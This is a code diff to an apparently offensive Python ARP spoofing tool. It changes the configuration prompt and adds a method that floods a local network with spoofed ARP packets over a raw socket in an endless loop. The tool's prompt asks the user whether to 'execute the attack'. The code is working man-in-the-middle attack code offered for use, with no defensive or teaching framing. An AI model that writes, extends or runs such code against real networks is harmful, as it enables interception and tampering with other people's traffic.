@@ -37,7 +37,7 @@ class Spoofer(object):
                     sock.send(packet)
                 time.sleep(self.interval)
 
-    def __display_user_prompt(self):
+    def __display_setup_prompt(self):
         print('\n[>>>] ARP Spoofing configuration:')
         configurations = {'IPv4 Forwarding': str(self.__ip_forwarding),
                           'Interface': self.__arp.interface,
@@ -48,7 +48,7 @@ class Spoofer(object):
                           'Target MAC': self.__arp.packets.target_mac}
 
         for setting, value in configurations.items():
-            print('{0: >7} {1: <13}{2:.>25}'.format('[+]', setting, value))
+            print('{0: >7} {1: <16}{2:.>25}'.format('[+]', setting, value))
 
         while True:
             proceed = input('\n[!] ARP packets ready. Execute the attack with '
@@ -59,6 +59,14 @@ class Spoofer(object):
                 break
             if proceed == 'n':
                 raise KeyboardInterrupt
+
+    def __send_attack_packets(self):
+        with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
+            sock.bind((self.__arp.interface, htons(0x0800)))
+            while True:
+                for packet in self.__arp.packets:
+                    sock.send(packet)
+                time.sleep(self.__interval)
 
 
 if __name__ == '__main__':
